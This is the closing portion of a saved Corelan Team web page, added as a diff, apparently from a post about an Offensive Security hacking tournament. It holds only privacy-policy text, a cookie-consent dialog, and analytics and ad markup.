+personal details by written request to Corelan. &nbsp;If you decide to 
+get your information removed, you understand and accept that you will 
+lose all access to any resources that require the use of these personal 
+details, such as parts of the website that require authentication.</p>
+<p>f. When using the Corelan Website, cookies may possible be used. You 
+do not have to accept cookies to be able to use the publicly accessible 
+parts of Corelan Websites.&nbsp;If you have an account and you log in to
+ this site, we will set a temporary cookie to determine if your browser 
+accepts cookies. This cookie contains no personal data and is discarded 
+when you close your browser.</p>
+<p>When you log in, we will also set up several cookies to save your 
+login information and your screen display choices.&nbsp; &nbsp;Cookies 
+may be used to display advertisements or to collect statistics about the
+ use of the Corelan website.</p>
+<p>g. This privacy policy may be amended by Corelan at any time.</p>
+  	  </div>
+  <!--  .moove-gdpr-tab-main-content -->
+
+</div>
+<!-- #privacy_overview -->          
+  <div id="strict-necessary-cookies" class="moove-gdpr-tab-main" style="display:none">
+    <span class="tab-title">Strictly Necessary Cookies</span>
+    <div class="moove-gdpr-tab-main-content">
+      <p>Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.</p>
+      <div class="moove-gdpr-status-bar ">
+        <div class="gdpr-cc-form-wrap">
+          <div class="gdpr-cc-form-fieldset">
+            <label class="cookie-switch" for="moove_gdpr_strict_cookies">    
+              <span class="gdpr-sr-only">Enable or Disable Cookies</span>        
+              <input type="checkbox" value="check" name="moove_gdpr_strict_cookies" id="moove_gdpr_strict_cookies">
+              <span class="cookie-slider cookie-round" data-text-enable="Enabled" data-text-disabled="Disabled"></span>
+            </label>
+          </div>
+          <!-- .gdpr-cc-form-fieldset -->
+        </div>
+        <!-- .gdpr-cc-form-wrap -->
+      </div>
+      <!-- .moove-gdpr-status-bar -->
+              <div class="moove-gdpr-strict-warning-message" style="margin-top: 10px;">
+          <p>If you disable this cookie, we will not be able to save 
+your preferences. This means that every time you visit this website you 
+will need to enable or disable cookies again.</p>
+        </div>
+        <!--  .moove-gdpr-tab-main-content -->
+                                              
+    </div>
+    <!--  .moove-gdpr-tab-main-content -->
+  </div>
+  <!-- #strict-necesarry-cookies -->
+          
+          
+          
+  <div id="cookie_policy_modal" class="moove-gdpr-tab-main" style="display:none">
+    <span class="tab-title">Cookie Policy</span>
+    <div class="moove-gdpr-tab-main-content">
+      <p>When using the Corelan Website, cookies may possible be used. 
+You do not have to accept cookies to be able to use the publicly 
+accessible parts of the Corelan Website.&nbsp;If you have an account and
+ you log in to this site, we will set a temporary cookie to determine if
+ your browser accepts cookies. This cookie contains no personal data and
+ is discarded when you close your browser. When you log in, we will also
+ set up several cookies to save your login information and your screen 
+display choices.</p>
+<p>We may use third party cookies to show ads and to collect anonymous 
+information such as the number of visitors to the site, and the most 
+popular pages.&nbsp; The ability to show ads is an important source of 
+income to cover the hosting fees to keep this website alive. If you 
+prevent ads from being displayed, this website will eventually 
+disappear.</p>
+       
+    </div>
+    <!--  .moove-gdpr-tab-main-content -->
+  </div>
+        </div>
+        <!--  .moove-gdpr-tab-content -->
+      </div>
+      <!--  .main-modal-content -->
+      <div class="moove-gdpr-modal-footer-content">
+        <div class="moove-gdpr-button-holder">
+  <button class="mgbutton moove-gdpr-modal-allow-all button-visible">Enable All</button>
+  <button class="mgbutton moove-gdpr-modal-save-settings button-visible">Save Changes</button>
+</div>
+<!--  .moove-gdpr-button-holder -->      </div>
+      <!--  .moove-gdpr-modal-footer-content -->
+    </div>
+    <!--  .moove-gdpr-modal-right-content -->
+
+    <div class="moove-clearfix"></div>
+
+  </div>
+  <!--  .moove-gdpr-modal-content -->
+</div>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/e-202036.js" async="async" defer="defer" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" class="joplin-clipper-hidden">
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:8.8.2',blog:'15427359',post:'3767',tz:'2',srv:'www.corelan.be'} ]);
+	_stq.push([ 'clickTrackerInit', '15427359', '3767' ]);
+</script>
+	        
+    </div>
+
+
+<img src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/g.gif" alt=":)" id="wpstats" width="6" height="5"><ins class="adsbygoogle adsbygoogle-noablate joplin-clipper-hidden" style="display: none !important;" data-adsbygoogle-status="done"><ins id="aswift_1_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><ins id="aswift_1_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><iframe id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/ads_002.html" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!1" data-load-complete="true" frameborder="0"></iframe></ins></ins></ins><ins class="adsbygoogle adsbygoogle-noablate joplin-clipper-hidden" style="display: none !important;" data-adsbygoogle-status="done"></ins><iframe id="google_osd_static_frame_1012070349100" name="google_osd_static_frame" style="display: none; width: 0px; height: 0px;" class="joplin-clipper-hidden"></iframe><ins class="adsbygoogle adsbygoogle-noablate joplin-clipper-hidden" style="display: none !important;" data-adsbygoogle-status="done"></ins></body><iframe id="google_esf" name="google_esf" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/zrt_lookup.html" style="display: none;" data-ad-client="ca-pub-8134501503628637" class="joplin-clipper-hidden"></iframe></html>
